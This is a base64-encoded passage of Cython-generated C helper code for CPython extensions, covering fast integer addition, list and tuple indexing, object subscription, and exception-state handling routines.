VHSDsKICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBkZWZhdWx0OiByZXR1cm4gUHlMb25nX1R5cGUudHBfYXNfbnVtYmVyLT5uYl9hZGQob3AxLCBvcDIpOwogICAgICAgIH0KICAgIH0KICAgICAgICAgICAgeCA9IGEgKyBiOwogICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoeCk7CiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgbG9uZ19sb25nOgogICAgICAgICAgICBsbHggPSBsbGEgKyBsbGI7CiAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcobGx4KTsKI2VuZGlmCiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpOwogICAgCiAgICAKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqZmxvYXRfdmFsLCBsb25nIGludHZhbCwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDsKICAgIGRvdWJsZSBhID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoZmxvYXRfdmFsKTsKICAgICAgICBkb3VibGUgcmVzdWx0OwogICAgICAgIAogICAgICAgIHJlc3VsdCA9ICgoZG91YmxlKWEpICsgKGRvdWJsZSliOwogICAgICAgIHJldHVybiBQeUZsb2F0X0Zyb21Eb3VibGUocmVzdWx0KTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnR2YWwpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3Qob3AxKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfVW5wYWNrZWRfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIH0KICAgICNlbmRpZgogICAgaWYgKFB5RmxvYXRfQ2hlY2tFeGFjdChvcDEpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgaW50dmFsLCB6ZXJvZGl2aXNpb25fY2hlY2spOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnBsYWNlKTsKfQojZW5kaWYKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhQeU9iamVjdCAqbywgUHlPYmplY3QqIGopIHsKICAgIFB5T2JqZWN0ICpyOwogICAgaWYgKHVubGlrZWx5KCFqKSkgcmV0dXJuIE5VTEw7CiAgICByID0gUHlPYmplY3RfR2V0SXRlbShvLCBqKTsKICAgIFB5X0RFQ1JFRihqKTsKICAgIHJldHVybiByOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCBib3VuZHNjaGVjaykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgJiYgIUNZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMKICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTsKICAgIGlmICh3cmFwYXJvdW5kICYgdW5saWtlbHkoaSA8IDApKSB7CiAgICAgICAgd3JhcHBlZF9pICs9IFB5TGlzdF9HRVRfU0laRShvKTsKICAgIH0KICAgIGlmICgoIWJvdW5kc2NoZWNrKSB8fCBsaWtlbHkoX19QeXhfaXNfdmFsaWRfaW5kZXgod3JhcHBlZF9pLCBQeUxpc3RfR0VUX1NJWkUobykpKSkgewogICAgICAgIFB5T2JqZWN0ICpyID0gUHlMaXN0X0dFVF9JVEVNKG8sIHdyYXBwZWRfaSk7CiAgICAgICAgUHlfSU5DUkVGKHIpOwogICAgICAgIHJldHVybiByOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpOwojZWxzZQogICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCBib3VuZHNjaGVjaykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTsKICAgIGlmICh3cmFwYXJvdW5kICYgdW5saWtlbHkoaSA8IDApKSB7CiAgICAgICAgd3JhcHBlZF9pICs9IFB5VHVwbGVfR0VUX1NJWkUobyk7CiAgICB9CiAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KHdyYXBwZWRfaSwgUHlUdXBsZV9HRVRfU0laRShvKSkpKSB7CiAgICAgICAgUHlPYmplY3QgKnIgPSBQeVR1cGxlX0dFVF9JVEVNKG8sIHdyYXBwZWRfaSk7CiAgICAgICAgUHlfSU5DUkVGKHIpOwogICAgICAgIHJldHVybiByOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpOwojZWxzZQogICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLCBpbnQgaXNfbGlzdCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgYm91bmRzY2hlY2spIHsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgaWYgKGlzX2xpc3QgfHwgUHlMaXN0X0NoZWNrRXhhY3QobykpIHsKICAgICAgICBQeV9zc2l6ZV90IG4gPSAoKCF3cmFwYXJvdW5kKSB8IGxpa2VseShpID49IDApKSA/IGkgOiBpICsgUHlMaXN0X0dFVF9TSVpFKG8pOwogICAgICAgIGlmICgoIWJvdW5kc2NoZWNrKSB8fCAobGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KG4sIFB5TGlzdF9HRVRfU0laRShvKSkpKSkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgbik7CiAgICAgICAgfQogICAgfQogICAgZWxzZSBpZiAoUHlUdXBsZV9DaGVja0V4YWN0KG8pKSB7CiAgICAgICAgUHlfc3NpemVfdCBuID0gKCghd3JhcGFyb3VuZCkgfCBsaWtlbHkoaSA+PSAwKSkgPyBpIDogaSArIFB5VHVwbGVfR0VUX1NJWkUobyk7CiAgICAgICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleChuLCBQeVR1cGxlX0dFVF9TSVpFKG8pKSkpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnIgPSBQeVR1cGxlX0dFVF9JVEVNKG8sIG4pOwogICAgICAgICAgICBQeV9JTkNSRUYocik7CiAgICAgICAgICAgIHJldHVybiByOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgUHlNYXBwaW5nTWV0aG9kcyAqbW0gPSBQeV9UWVBFKG8pLT50cF9hc19tYXBwaW5nOwogICAgICAgIFB5U2VxdWVuY2VNZXRob2RzICpzbSA9IFB5X1RZUEUobyktPnRwX2FzX3NlcXVlbmNlOwogICAgICAgIGlmIChtbSAmJiBtbS0+bXBfc3Vic2NyaXB0KSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpyLCAqa2V5ID0gUHlMb25nX0Zyb21Tc2l6ZV90KGkpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIWtleSkpIHJldHVybiBOVUxMOwogICAgICAgICAgICByID0gbW0tPm1wX3N1YnNjcmlwdChvLCBrZXkpOwogICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTsKICAgICAgICAgICAgcmV0dXJuIHI7CiAgICAgICAgfQogICAgICAgIGlmIChsaWtlbHkoc20gJiYgc20tPnNxX2l0ZW0pKSB7CiAgICAgICAgICAgIGlmICh3cmFwYXJvdW5kICYmIHVubGlrZWx5KGkgPCAwKSAmJiBsaWtlbHkoc20tPnNxX2xlbmd0aCkpIHsKICAgICAgICAgICAgICAgIFB5X3NzaXplX3QgbCA9IHNtLT5zcV9sZW5ndGgobyk7CiAgICAgICAgICAgICAgICBpZiAobGlrZWx5KGwgPj0gMCkpIHsKICAgICAgICAgICAgICAgICAgICBpICs9IGw7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmICghUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19PdmVyZmxvd0Vycm9yKSkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gc20tPnNxX2l0ZW0obywgaSk7CiAgICAgICAgfQogICAgfQojZWxzZQogICAgaWYgKGlzX2xpc3QgfHwgIVB5TWFwcGluZ19DaGVjayhvKSkgewogICAgICAgIHJldHVybiBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSk7CiAgICB9CiNlbmRpZgogICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpIHsKICAgIFB5T2JqZWN0ICphcmdzWzJdID0ge05VTEwsIGFyZ307CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuYywgYXJncysxLCAxIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTsKfQoKCiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJbmRleChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqaW5kZXgpIHsKICAgIFB5T2JqZWN0ICpydW5lcnIgPSBOVUxMOwogICAgUHlfc3NpemVfdCBrZXlfdmFsdWU7CiAgICBrZXlfdmFsdWUgPSBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChpbmRleCk7CiAgICBpZiAobGlrZWx5KGtleV92YWx1ZSAhPSAtMSB8fCAhKHJ1bmVyciA9IFB5RXJyX09jY3VycmVkKCkpKSkgewogICAgICAgIHJldHVybiBfX1B5eF9HZXRJdGVtSW50X0Zhc3Qob2JqLCBrZXlfdmFsdWUsIDAsIDEsIDEpOwogICAgfQogICAgaWYgKFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhydW5lcnIsIFB5RXhjX092ZXJmbG93RXJyb3IpKSB7CiAgICAgICAgX19QeXhfVHlwZU5hbWUgaW5kZXhfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKGluZGV4KSk7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfSW5kZXhFcnJvciwKICAgICAgICAgICAgImNhbm5vdCBmaXQgJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIGludG8gYW4gaW5kZXgtc2l6ZWQgaW50ZWdlciIsIGluZGV4X3R5cGVfbmFtZSk7CiAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKGluZGV4X3R5cGVfbmFtZSk7CiAgICB9CiAgICByZXR1cm4gTlVMTDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0dldEl0ZW1fU2xvdyhQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KSB7CiAgICBfX1B5eF9UeXBlTmFtZSBvYmpfdHlwZV9uYW1lOwogICAgaWYgKGxpa2VseShQeVR5cGVfQ2hlY2sob2JqKSkpIHsKICAgICAgICBQeU9iamVjdCAqbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsYXNzX2dldGl0ZW0pOwogICAgICAgIGlmICghbWV0aCkgewogICAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKG1ldGgsIGtleSk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTsKICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICB9CiAgICB9CiAgICBvYmpfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKG9iaikpOwogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAiJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIG9iamVjdCBpcyBub3Qgc3Vic2NyaXB0YWJsZSIsIG9ial90eXBlX25hbWUpOwogICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKG9ial90eXBlX25hbWUpOwogICAgcmV0dXJuIE5VTEw7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJdGVtKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICprZXkpIHsKICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7CiAgICBQeU1hcHBpbmdNZXRob2RzICptbSA9IHRwLT50cF9hc19tYXBwaW5nOwogICAgUHlTZXF1ZW5jZU1ldGhvZHMgKnNtID0gdHAtPnRwX2FzX3NlcXVlbmNlOwogICAgaWYgKGxpa2VseShtbSAmJiBtbS0+bXBfc3Vic2NyaXB0KSkgewogICAgICAgIHJldHVybiBtbS0+bXBfc3Vic2NyaXB0KG9iaiwga2V5KTsKICAgIH0KICAgIGlmIChsaWtlbHkoc20gJiYgc20tPnNxX2l0ZW0pKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0dldEluZGV4KG9iaiwga2V5KTsKICAgIH0KICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9HZXRJdGVtX1Nsb3cob2JqLCBrZXkpOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgX1B5RXJyX1N0YWNrSXRlbSAqCl9fUHl4X1B5RXJyX0dldFRvcG1vc3RFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlKQp7CiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICB3aGlsZSAoKGV4Y19pbmZvLT5leGNfdmFsdWUgPT0gTlVMTCB8fCBleGNfaW5mby0+ZXhjX3ZhbHVlID09IFB5X05vbmUpICYmCiAgICAgICAgICAgZXhjX2luZm8tPnByZXZpb3VzX2l0ZW0gIT0gTlVMTCkKICAgIHsKICAgICAgICBleGNfaW5mbyA9IGV4Y19pbmZvLT5wcmV2aW91c19pdGVtOwogICAgfQogICAgcmV0dXJuIGV4Y19pbmZvOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU2F2ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikgewogICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpOwogICAgUHlPYmplY3QgKmV4Y192YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7CiAgICBpZiAoZXhjX3ZhbHVlID09IE5VTEwgfHwgZXhjX3ZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICAqdmFsdWUgPSBOVUxMOwogICAgICAgICp0eXBlID0gTlVMTDsKICAgICAgICAqdGIgPSBOVUxMOwogICAgfSBlbHNlIHsKICAgICAgICAqdmFsdWUgPSBleGNfdmFsdWU7CiAgICAgICAgUHlfSU5DUkVGKCp2YWx1ZSk7CiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7CiAgICAgICAgUHlfSU5DUkVGKCp0eXBlKTsKICAgICAgICAqdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2soZXhjX3ZhbHVlKTsKICAgIH0KICAjZWxpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IF9fUHl4X1B5RXJyX0dldFRvcG1vc3RFeGNlcHRpb24odHN0YXRlKTsKICAgICp0eXBlID0gZXhjX2luZm8tPmV4Y190eXBlOwogICAgKnZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgICp0YiA9IGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrOwogICAgUHlfWElOQ1JFRigqdHlwZSk7CiAgICBQeV9YSU5DUkVGKCp2YWx1ZSk7CiAgICBQeV9YSU5DUkVGKCp0Yik7CiAgI2Vsc2UKICAgICp0eXBlID0gdHN0YXRlLT5leGNfdHlwZTsKICAgICp2YWx1ZSA9IHRzdGF0ZS0+ZXhjX3ZhbHVlOwogICAgKnRiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrOwogICAgUHlfWElOQ1JFRigqdHlwZSk7CiAgICBQeV9YSU5DUkVGKCp2YWx1ZSk7CiAgICBQeV9YSU5DUkVGKCp0Yik7CiAgI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHsKICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICBQeU9iamVjdCAqdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSB2YWx1ZTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodHlwZSk7CiAgICBQeV9YREVDUkVGKHRiKTsKICAjZWxzZQogICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiOwogICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIHRtcF90YiA9IGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrOwogICAgZXhjX2luZm8tPmV4Y190eXBlID0gdHlwZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSB2YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gdGI7CiAgICAjZWxzZQogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmV4Y190eXBlID0gdHlwZTsKICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gdmFsdWU7CiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSB0YjsKICAgICNlbmRpZgogICAgUHlfWERFQ1JFRih0bXBfdHlwZSk7CiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKHRtcF90Yik7CiAgI2VuZGlmCn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpCiNlbHNlCnN0YXRpYyBpbnQgX19QeXhfR2V0RXhjZXB0aW9uKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikKI2VuZGlmCnsKICAgIFB5T2JqZWN0ICpsb2NhbF90eXBlID0gTlVMTCwgKmxvY2FsX3ZhbHVlLCAqbG9jYWxfdGIgPSBOVUxMOwojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAgIGxvY2FsX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjsKICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSAwOwogICNlbHNlCiAgICBsb2NhbF90eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTsKICAgIGxvY2FsX3ZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7CiAgICBsb2NhbF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+Y3VyZXhjX3R5cGUgPSAwOwogICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSAwOwogICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gMDsKICAjZW5kaWYKI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDAKICAgIGxvY2FsX3ZhbHVlID0gUHlFcnJfR2V0UmFpc2VkRXhjZXB0aW9uKCk7CiNlbHNlCiAgICBQeUVycl9GZXRjaCgmbG9jYWxfdHlwZSwgJmxvY2FsX3ZhbHVlLCAmbG9jYWxfdGIpOwojZW5kaWYKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwCiAgICBpZiAobGlrZWx5KGxvY2FsX3ZhbHVlKSkgewogICAgICAgIGxvY2FsX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGxvY2FsX3ZhbHVlKTsKICAgICAgICBQeV9JTkNSRUYobG9jYWxfdHlwZSk7CiAgICAgICAgbG9jYWxfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2sobG9jYWxfdmFsdWUpOwogICAgfQojZWxzZQogICAgUHlFcnJfTm9ybWFsaXplRXhjZXB0aW9uKCZsb2NhbF90eXBlLCAmbG9jYWxfdmFsdWUsICZsb2NhbF90Yik7CiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgIGlmICh1bmxpa2VseSh0c3RhdGUtPmN1cmV4Y190eXBlKSkKI2Vsc2UKICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkKI2VuZGlmCiAgICAgICAgZ290byBiYWQ7CiAgICBpZiAobG9jYWxfdGIpIHsKICAgICAgICBpZiAodW5saWtlbHkoUHlFeGNlcHRpb25fU2V0VHJhY2ViYWNrKGxvY2FsX3ZhbHVlLCBsb2NhbF90YikgPCAwKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICB9CiNlbmRpZiAvLyBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzBDMDAwMAogICAgUHlfWElOQ1JFRihsb2NhbF90Yik7CiAgICBQeV9YSU5DUkVGKGxvY2FsX3R5cGUpOwogICAgUHlfWElOQ1JFRihsb2NhbF92YWx1ZSk7CiAgICAqdHlwZSA9IGxvY2FsX3R5cGU